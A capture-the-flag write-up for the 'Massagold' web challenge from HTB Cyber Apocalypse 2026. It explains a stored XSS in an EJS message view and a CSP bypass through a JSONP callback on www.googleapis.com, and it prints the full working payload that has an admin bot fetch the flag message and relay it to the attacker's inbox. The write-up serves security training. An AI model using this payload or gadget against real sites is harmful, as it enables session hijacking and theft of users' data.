---
title: "Massagold"
event: "HTB Cyber Apocalypse 2026"
category: "Web"
difficulty: "Very Easy"
technique: "Stored XSS → CSP bypass via JSONP gadget → admin bot session hijack"
date: 2026-07-24
---

# Massagold

**Event:** HTB Cyber Apocalypse 2026
**Category:** Web
**Difficulty:** Very Easy
**Target:** ephemeral instance (e.g. `http://154.57.164.75:31794`)
**Mentored via:** a custom fork of [0xdf](https://gitlab.com/0xdf/htb-ai-mentor/-/tree/main)'s Socratic HTB-mentoring skill

Massagold is a very easy web challenge (HTB Cyber Apocalypse 2026) built around a medieval "sealed letters" messaging app. The flag lives in a message only `admin` can read. An admin bot visits any message sent to `admin`, so the path is: find a stored XSS in the message renderer, bypass a restrictive CSP using a JSONP gadget on a whitelisted Google domain, and use the admin bot's session to fetch the flag message and relay it back into your own inbox.

## Enumeration

Source is provided with the challenge, so enumeration is source review rather than port scanning.

### Seeded data — where the flag lives

`entrypoint.js` seeds six accounts and a handful of messages, then writes the flag into the **first** message, sent from `archivist` to `admin`:

```javascript
for (const username of ['admin', 'archivist', 'scribe', 'ravenmaster', 'minstrel', 'alchemist']) {
  users[username] = await createUser(username);
}
// ...
await createMessage(
  users.archivist,
  users.admin,
  `Archive notice:\n\nThe sealed royal record reads:\n${flag}`
);
```

Messages are auto-increment IDs, so this flag message is `id = 1`. You can self-register via `/register`, but a fresh account can't read someone else's mail.

### Message access is ownership-scoped (no direct IDOR)

`app/controllers/messageController.js` → `showMessage` scopes every lookup to the logged-in user:

```javascript
WHERE messages.id = ?
  AND messages.recipient_id = ?
```

Requesting `/messages/1` through `/messages/11` as a self-registered user all return `Message not found` — the `recipient_id` check kills any direct IDOR. The flag has to be read *as admin*.

### The admin bot

`app/controllers/messageController.js` → `sendMessage` triggers a headless bot whenever a message is sent **to `admin`**:

```javascript
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

`bot/bot.js` logs in as `admin` (reading real credentials from disk) with Playwright Firefox and navigates to the message you just sent:

```javascript
await loginAsAdmin(page);
await page.goto(appUrl(`/messages/${encodeURIComponent(messageId)}`), { waitUntil: 'load' });
await page.waitForTimeout(WAIT_AFTER_LOAD_MS); // 2000ms
```

So any script in a message body executes in an authenticated admin browser. That's the primitive.

## Stored XSS in the message renderer

`app/views/message.ejs` renders the message body with EJS's **unescaped** output tag:

```html
<pre class="letter-copy"><%- message.content %></pre>
```

`<%-` emits raw HTML (vs. `<%=` which escapes). Content is dropped directly as element text inside the `<pre>` — no attribute context to break out of, so a bare `<script>` tag injects cleanly, no `">` prefix needed. Sending a message to `admin` gets that script run in admin's session by the bot.

## Bypassing the CSP with a Google JSONP gadget

`app/server.js` sets a CSP that blocks inline scripts:

```text
script-src 'self' https://www.googleapis.com;
connect-src 'self';
```

Two consequences:

- Inline `<script>alert(1)</script>` is **blocked** (`'unsafe-inline'` absent) — confirmed in the console as a CSP violation.
- `connect-src 'self'` means no exfiltration to an external server — data has to stay same-origin (hence: relay it back into your own inbox as a message).

The tell is `script-src` whitelisting `https://www.googleapis.com` — a domain this app never otherwise uses. That host serves JSONP endpoints. `customsearch/v1` reflects the `callback` parameter into the response body:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
```

This loads from a whitelisted origin (CSP-legal) and executes `alert(1)` — arbitrary JS execution despite the CSP. Note the domain must be exactly `www.googleapis.com`; CSP host matching is origin-exact, so `ajax.googleapis.com` / `translate.googleapis.com` gadgets from the usual cheat sheets are rejected here.

### Surviving Google's callback escaping

The catch: `customsearch/v1` treats a callback containing illegal characters as an *invalid* JSONP name and JSON-escapes it before echoing. Fetching the URL directly shows what actually lands in the executed script:

```text
fetch(\"/messages/1\")\n  .then(res => ...
```

`"` → `\"`, newlines → `\n`, `<`/`>` → `<`/`>`. Outside a string literal those are syntax errors, so the payload never runs (silent failure — no console error on the bot). The fix is to write JS that contains none of the mangled characters:

- **No `"`** — single quotes only.
- **No newlines** — one single line.
- **No `=>`** (contains `>`) — use `function(){}`.
- **No regex literal backslashes** — use `new RegExp('...')` and the `[^]` "any char" class instead of `[\s\S]`.

Validated by saving Google's echoed response and running `node --check` on it until it parsed clean.

## Reading the flag and relaying it back

Final payload logic (single line), sent as a message body to `admin`:

```javascript
fetch('/messages/1')
  .then(function (r) { return r.text(); })
  .then(function (h) {
    var m = h.match(new RegExp('<pre class="letter-copy">([^]*?)</pre>'));
    return fetch('/messages', {
      method: 'POST',
      body: new URLSearchParams({ to_username: 'a', content: m[1] }).toString(),
      headers: { 'Content-type': 'application/x-www-form-urlencoded' }
    });
  })
```

Delivered as the callback of the JSONP gadget:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=fetch('%2Fmessages%2F1')...%7D)"></script>
```

Running in the admin bot's session: `fetch('/messages/1')` succeeds (admin *is* the recipient), the regex pulls the flag out of the `<pre class="letter-copy">` block, and the second `fetch` POSTs it back — with `to_username` set to your own account (`a`) — as a normal message. `express.urlencoded()` is the only body parser mounted, so the POST must be `application/x-www-form-urlencoded` (`URLSearchParams`), not JSON.

## Root

Wait for the bot (queue + 2s dwell), reload your own inbox: a new message from `admin` contains the flag text pulled from message 1 (`Archive notice: ... HTB{...}`).

## Summary

| Stage | Technique |
|---------------------|-----------------------------------------------------------|
| Recon               | Source review — flag in seeded message `id=1`, admin-only |
| Access control      | `recipient_id` scoping blocks direct IDOR on `/messages/:id` |
| Execution primitive | Stored XSS via `<%- message.content %>`; admin bot visits messages sent to `admin` |
| CSP bypass          | JSONP gadget on whitelisted `www.googleapis.com/customsearch/v1?callback=` |
| Exfiltration        | Same-origin (`connect-src 'self'`) POST relaying the flag into own inbox |

## Lessons Learned

- **An oddly-specific CSP allow-list entry is a hint, not noise.** A messaging app whitelisting `www.googleapis.com` for scripts exists only to be abused — it points straight at a JSONP gadget. `'self'` alone would have made this challenge much harder.
- **CSP source matching is origin-exact.** `script-src ... https://www.googleapis.com` does *not* cover `ajax.googleapis.com` or `translate.googleapis.com`. Most public "Google JSONP CSP bypass" payloads target the wrong subdomain and get silently blocked.
- **JSONP callbacks get sanitized.** `customsearch/v1` JSON-escapes an "invalid" callback (`"`→`\"`, newline→`\n`, `<`→`<`). Payloads must avoid double quotes, newlines, `=>`, and regex-literal backslashes. Verify by fetching the gadget URL directly and `node --check`-ing the echoed body before ever sending it to the bot.
- **Instrument before assuming.** A silently-failing chain wasted the most time. The fix that unblocked it was a *canary*: strip the payload down to only the POST-back with a literal string to confirm the bot reaches Google and executes JS, then add the extraction half back. Bisect the chain instead of re-reading the whole thing.
- **Dead ends that cost time:** (1) a browser ad-blocker showed the googleapis request as `blocked:other` locally — meaningless, since the clean Playwright bot has no extensions; test in a private window. (2) The target IP in old notes was stale (CTF instances rotate) and had been reassigned to a different challenge. (3) Stale, broken earlier sends jammed the bot's serial queue (each hangs to the 10s timeout), so a *correct* payload appeared to "do nothing" — clear the noise and resend clean.
